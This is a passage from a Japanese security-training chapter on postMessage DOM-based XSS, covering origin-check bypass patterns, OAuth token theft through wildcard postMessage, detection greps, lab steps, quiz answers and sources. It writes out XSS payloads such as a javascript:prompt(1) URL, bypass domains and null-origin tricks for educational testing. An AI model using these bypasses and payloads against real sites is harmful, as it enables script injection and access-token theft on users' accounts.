	/registerPlugin|registerKeyboardShortcut|addKeyBinding|addEventListener|showPreview|previewIframe/;
```

DOM / プラグイン / イベント登録系の危険メソッドを postMessage から呼べないようにする対策だ。

---

## 12. 検出と緩和のまとめ、そして現代の運用ノート

### 12.1 緩和の原則

- 他サイトからメッセージを受け取ることを想定するなら、常に `origin`（必要なら `source`）で送信元の身元を検証する。
- さらに受信メッセージの構文（スキーマ）を常に検証する。信頼した送信元にセキュリティホールがあると、それが自サイトの XSS ホールに転じうるためだ。
- URL を sink（`location.href`, `<a href>` 等）に流す場合は、`javascript:` / `data:` などの危険スキームを弾き、HTTP/HTTPS のみ許可する。
- origin 検証は `indexOf()` / `search()` / `match()` ではなく、厳密等価（`===`）か、正しくパースした URL の origin 比較で行う。

### 12.2 現代の運用ノート（jlajara 以降の二次資料。原典の記述ではない）

〔補足〕主出典は GitHub の `guan4tou2/bug-bounty-vault-framework` で、同ファイルは jlajara・Intigriti・jorianwoltjer book・PortSwigger・Microsoft MSRC を出典に挙げている。

- **OAuth/SSO ポップアップのトークン窃取**が現代の高価値シンク。正規のログインポップアップが完了時に `window.opener.postMessage({access_token:'...'}, '*')` のようにワイルドカードでトークンをブロードキャストすると、攻撃者ページが `window.open()` でそのポップアップを開き自分の `message` リスナーで受けるだけでトークンを奪える。
- 弱い origin 検証の類型（一覧）:

| 実装 | バイパス例 | 前提 |
|---|---|---|
| `e.origin.indexOf('target.com') !== -1` | `https://target.com.attacker.io` または `https://attacker.com/?target.com` | 一致ドメイン取得 or 経路 |
| `e.origin.startsWith('https://app.target.com')` | `https://app.target.com.attacker.io` | 攻撃者ルートドメイン |
| `e.origin.endsWith('.target.com')` | `https://eviltarget.com`（ドット無し）等 | 状況依存 |
| 未エスケープ `.` の regex `^https://sub.target.com$` | `https://subXtarget.com` | 当該ドメイン取得 |
| `$` 未アンカーの regex `^https://sub\.target\.com` | `https://sub.target.com.attacker.io` | 攻撃者ルートドメイン |
| `e.origin === window.origin` | サンドボックス iframe（`srcdoc`）で両辺を `'null'` に | 被害者を誘導可 |

- 検出シグナル: JS バンドルを `grep -nE "addEventListener\(['\"]message|onmessage\s*="`、Chrome DevTools の Sources → Global Listeners で `message`、コンソールで `getEventListeners(window).message`、Burp DOM Invader / PostMessage-Tracker 拡張。
- バグバウンティでの過大主張回避: 「origin 未検証」を単体で出すと N/A / Informative クローズされやすい。攻撃者ページ→被害者が開く→sink 発火を観測する end-to-end PoC が要る。sink が `console.log` や UI 状態変更のみなら影響を過大に書かない。概算重大度は、postMessage → `eval` / `innerHTML` sink ＋ origin 検証欠如 ＋ end-to-end XSS PoC で P2 High、OAuth トークンのワイルドカード配布を実捕捉で P1–P2 とされる。

> ### 📌 ここは自分で開いて読んでください
> **資料**: Intigriti「Exploiting postMessage vulnerabilities」 — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities ／ PortSwigger「Controlling the web message source」 — https://portswigger.net/web-security/dom-based/controlling-the-web-message-source ／ jorianwoltjer book「postMessage exploitation」 — https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation ／ Microsoft MSRC「postMessage’d and Compromised」 — https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised
> **なぜ**: いずれも本教科書の執筆環境から自動取得できなかった（理由: Intigriti / jorianwoltjer / PortSwigger は egress ブロックで 403、MSRC はボット保護で 403）。読者自身の通常ブラウザからは問題なく読めるはずである。
> **読みどころ**:
> 1. Intigriti: 実務的なリスナー列挙から PoC 化までの手順、DOM Invader の使い方。
> 2. PortSwigger: 無料の対話式ラボで `addEventListener('message')` → `innerHTML` / `location` sink を自分の手で悪用体験できる。DOM-based の基礎固めに最適。
> 3. jorianwoltjer book: origin バイパスの体系整理、sandbox / null-origin の実演、最新ブラウザ挙動。
> 4. MSRC: 2025 年時点の実サービスでの postMessage 悪用事例とベンダ側の緩和動向。
> **代替手段**: PortSwigger Web Security Academy は無料アカウントでラボを実行できる。

---

## 手を動かす

以下は自分で立てた検証環境や、許可されたバグバウンティ対象での診断を前提とする。他人のサイトを許可なく攻撃してはならない。

1. **Part I のデモを手元に再現する。** 空のフォルダを作り、上の 1.html / 2.html / 3.html を逐語でそのまま保存する。`python3 -m http.server 8000` などで配信し、まず `1.html` を開いて「Open child」→「Send Message」を押し、`2.html` の「Go back」リンクが `changed.html` を指すのを確認する。
2. **XSS を発火させる。** 別タブで `3.html`（`2.html` を iframe 化する攻撃側）を開き、`2.html` 側の「Go back」をクリックする。`prompt(1)` が受信側オリジンで出れば成功。sink が `<a href>` なのでクリックが 1 回要ることを体感する。
3. **リスナーを列挙する。** 診断対象のページで DevTools コンソールを開き、`getEventListeners(window)` を実行して `message` リスナーがあるか確認する。Elements → Event Listeners タブでも同じものが見える。
4. **バンドルを grep する。** 対象の JS を保存し、`grep -nE "addEventListener\(['\"]message|onmessage\s*=|\.on\(['\"]message"` で受信登録を洗い出す。ヒットしたら、そのハンドラが `event.origin` を **厳密等価** で見ているか、それとも `indexOf` / `search` / 無検証かを目で追う。
5. **データフローを sink まで追う。** `event.data` がどの変数に入り、最終的に `location.href` / `innerHTML` / `<a>.href` / `eval` などに到達するかを人手でたどる。到達すれば候補、しなければ次のリスナーへ。
6. **origin 検証を破れるか試す。** `indexOf` なら前方一致するドメイン、`search` / `match` ならドットをワイルドカードに使えるドメイン、`e.origin == window.origin` ならサンドボックス iframe の null origin、という順で 5 節・6 節の技を当てはめる。
7. **end-to-end PoC を作る。** 攻撃者ページ（iframe か `window.open`）から `postMessage` を送り、`alert` かネットワークログか実際のトークン文字列で影響を観測する。ここまで揃えて初めてレポートにする。

## つまずきポイント

- **origin 未検証だけでは弱い。** それ自体は N/A / Informative でクローズされやすい。sink まで到達し、攻撃者ページからの end-to-end で発火を見せること。
- **`event.isTrusted` は認可に使えない。** ブラウザ由来かを示すだけで、送信元が信頼オリジンであることを保証しない。
- **`indexOf` の「向き」を読み違える。** #499030 のように `信頼文字列.indexOf(受信origin)===0` は「受信 origin が信頼文字列の接頭辞か」を見ており、逆向きで危険。`受信origin.indexOf(信頼文字列)` とはまったく意味が違う。
- **`search()` / `match()` に文字列を渡すと正規表現になる。** ドット（`.`）が任意 1 文字になり、`www.s.fedomain.com` のようなドメインで通ってしまう。
- **sink が `<a href>` か `location.href` かで発火条件が違う。** 前者はクリックが要り、後者は即ナビゲーションで自動発火しうる。
- **CSP で `javascript:` が止まっても終わりではない。** basic 認証フィッシング（#398054）や Safari の `data:`（#381356）に転用される。過信しない。
- **iframe 化できなくても諦めない。** `X-Frame-Options` / `frame-ancestors` があるなら `window.open()`＋`postMessage` に切り替える。
- **anquanke.com は jlajara 本人ではない。** 中国語の忠実な再現記事であり、コードは原典と一致するが、原典 narrative そのものは各自でアクセスして確認するのが望ましい。

## この節のまとめ

- `postMessage` は別オリジンのウィンドウ同士を安全に通信させるために作られた API で、`event.data` / `event.origin` / `event.source` を持つ `MessageEvent` を受信ハンドラに渡す。
- 脆弱性の本質は「受信側が `event.origin` を検証せず、`event.data` を危険な sink に流す」こと。
- 送信の `targetOrigin` は `'*'` だと任意オリジンに届く。機微データのワイルドカード送信は情報漏洩の根源になる。
- Part I の 1/2/3.html は、origin 未検証の受信側が `event.data.url` を `<a href>` に代入し、iframe 化した攻撃ページが `{url:"javascript:prompt(1)"}` を送ることで XSS に至る最小例である。
- 検出は「JS を読む」ことに尽き、`window.addEventListener('message')` / `$(window).on('message')` を grep し、`getEventListeners(window)` や Event Listeners タブ、Posta / postMessage-tracker で列挙してデータフローを sink まで追う。
- 雑な origin 検証は破れる。`indexOf` は前方一致、`search` / `match` はドットがワイルドカード、`escapeHtml` はオブジェクト上書きの欠陥、部分文字列スキームチェックは `javascript:...//http:` で回避される。
- 等価チェックはサンドボックス iframe の null origin（`null==null`）で、`e.source` チェックは送信 iframe の即時削除で破れる。フレーミング保護は `window.open()`＋`postMessage` で回避する。
- #398054 は Marketo forms2.js の origin 未検証リスナーが `followUpUrl` → `location.href` で DOM XSS になった実例で、CSP に阻まれつつも basic 認証フィッシングに転用された。
- その修正 `0 === i.indexOf(origin)` は向きが逆で、`.ma` ドメイン取得だけで #499030 としてバイパスされた。
- #381356 は同じ listener を Client-Side Race Condition で突き、CSP 下でも Safari の `data:` トップナビゲーションを使って偽サインインへ誘導した。
- reveal.js CVE-2020-8127 は `config.postMessage` 有効時に任意 `Reveal[method]` を呼べ、`addKeyBinding`（description 無検証格納）＋ `showHelp/toggleHelp`（innerHTML sink）の連鎖で XSS になる。修正版はメソッドのブラックリストで塞いだ。
- 緩和は `event.origin` の厳密等価（または正しい URL origin 比較）、`event.source` 確認、ペイロードのスキーマ・スキーム検証。バグバウンティでは end-to-end PoC を揃え、影響を過大に主張しない。

## 理解度チェック

1. postMessage の受信ハンドラで、脆弱性の有無を左右する最重要チェックは何か。
   ▶ 答え: `event.origin` の検証。これを省くと任意オリジンからのメッセージを受理し、`event.data` を sink に流してしまう。厳密には `event.origin === "https://trusted"` の等価比較で行う。

2. 送信の `targetOrigin` を `'*'` にすると何が危険か。
   ▶ 答え: 送信先 Window の現在のオリジンに関係なく配送されるため、iframe の中身を攻撃者ドメインにすり替えるなどして機微メッセージを奪われうる。厳密オリジンを指定すれば、そのオリジンを持つ時だけ配送される。

3. Part I の 3.html はどうやって XSS を起こすか。
   ▶ 答え: `2.html` を iframe として読み込み、`contentWindow.postMessage({url:"javascript:prompt(1)"}, '*')` を送る。`2.html` は origin 未検証でこれを `<a href>` に代入するので、ユーザーが「Go back」をクリックすると `javascript:` URI が発火する。

4. `origin.search("www.s.fedomain.com")` がバイパスされる理由は。
   ▶ 答え: `search()` は引数を正規表現として扱い、正規表現ではドット（`.`）が任意 1 文字にマッチする。よって `www.safedomain.com` も `www.sXfedomain.com` 系のドメインもマッチしうる。

5. #499030 で `0 === i.indexOf(a.originalEvent.origin)` が破れたのはなぜか。
   ▶ 答え: `i`（信頼オリジン `https://app-sj17.marketo.com/`）が受信 origin を先頭に含むかを見ている（向きが逆）ため、`https://app-sj17.ma` を登録すれば `indexOf` が `0` を返して条件を満たし、検証を通過する。

6. CSP で `javascript:` リダイレクトが止まる環境でも、#398054 / #381356 はどう影響を出したか。
   ▶ 答え: #398054 は `followUpUrl` を攻撃者の `401.php` にして basic 認証プロンプトを重ねるフィッシングに転用。#381356 は Safari が `data:` へのトップナビゲーションを制限しないことを使い、偽サインインページを `data:` URL で表示した。

7. reveal.js CVE-2020-8127 で、任意メソッド呼び出しが実際の XSS に化ける 2 段階を説明せよ。
   ▶ 答え: (1) `addKeyBinding` を postMessage で呼び、`binding.description` に HTML を無検証で `registeredKeyBindings` に格納させる。(2) `toggleHelp` / `showHelp` を呼ぶと、その `description` がエスケープされず `dom.overlay.innerHTML` に連結されて発火する。

8. リスナーを列挙する具体的な手段を 3 つ挙げよ。
   ▶ 答え: JS を `window.addEventListener` / `$(window).on('message')` で grep、DevTools コンソールで `getEventListeners(window)`、Elements → Event Listeners タブ。加えて Posta / postMessage-tracker / DOM Invader などの拡張も使える。

## 出典

- https://jlajara.gitlab.io/Dom_XSS_PostMessage （Part I。原典は egress ブロックで未取得）
- https://jlajara.gitlab.io/Dom_XSS_PostMessage_2 （Part II。原典は egress ブロックで未取得）
- https://www.anquanke.com/post/id/219088 （jlajara Part I/II の忠実な再現記事。GitHub mirror `wonderkun/crawler` 経由で逐語取得）
- https://hackerone.com/reports/398054 （Marketo forms2.js の DOM XSS。一次全文を GitHub mirror から逐語取得）
- https://hackerone.com/reports/499030 （#398054 修正の indexOf バイパス）
- https://hackerone.com/reports/381356 （Frans Rosén: Marketo race condition。一次全文を逐語取得）
- reveal.js `js/reveal.js` @ tag 3.9.1（GitHub `hakimel/reveal.js`。CVE-2020-8127 の脆弱ハンドラを逐語取得）
- HackTricks「PostMessage Vulnerabilities」 https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html （GitHub raw 経由で逐語取得）
- https://github.com/benso-io/posta ／ https://github.com/fransr/postMessage-tracker ／ https://github.com/ilmila/J2EEScan ／ https://github.com/wagiro/BurpBounty
- guan4tou2/bug-bounty-vault-framework（GitHub。現代的運用知の二次資料）
- https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities
- https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation
- https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
- https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised

<!-- self-read: https://jlajara.gitlab.io/Dom_XSS_PostMessage | 原典が egress ブロック（jlajara.gitlab.io 全体 403）で取得できず、二次記事ベースの要約のため -->
<!-- self-read: https://jlajara.gitlab.io/Dom_XSS_PostMessage_2 | 原典が egress ブロック（jlajara.gitlab.io 全体 403）で取得できず、一次レポートと再現記事ベースの要約のため -->
<!-- self-read: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities | egress ブロック（403 connect_rejected）で本文取得不能 -->
<!-- self-read: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source | egress ブロックで本文取得不能。無料ラボは読者環境で実行可能 -->
<!-- self-read: https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss/postmessage-exploitation | egress ブロックで本文取得不能 -->
<!-- self-read: https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised | ボット保護（403）で本文取得不能 -->

<!-- sources: https://jlajara.gitlab.io/Dom_XSS_PostMessage, https://jlajara.gitlab.io/Dom_XSS_PostMessage_2, https://www.anquanke.com/post/id/219088, https://hackerone.com/reports/398054, https://hackerone.com/reports/499030, https://hackerone.com/reports/381356, https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html -->
<!-- terms: postMessage, MessageEvent, event.origin, event.source, event.data, 同一オリジンポリシー, DOM-based XSS, sink, targetOrigin, ワイルドカードオリジン, origin検証バイパス, indexOf検証, null origin, サンドボックスiframe, X-Frame-Options, frame-ancestors, CSP, Marketo forms2.js, followUpUrl, reveal.js, CVE-2020-8127, addKeyBinding, showHelp, innerHTML, Client-Side Race Condition, getEventListeners, DOM Invader, Posta, postMessage-tracker -->
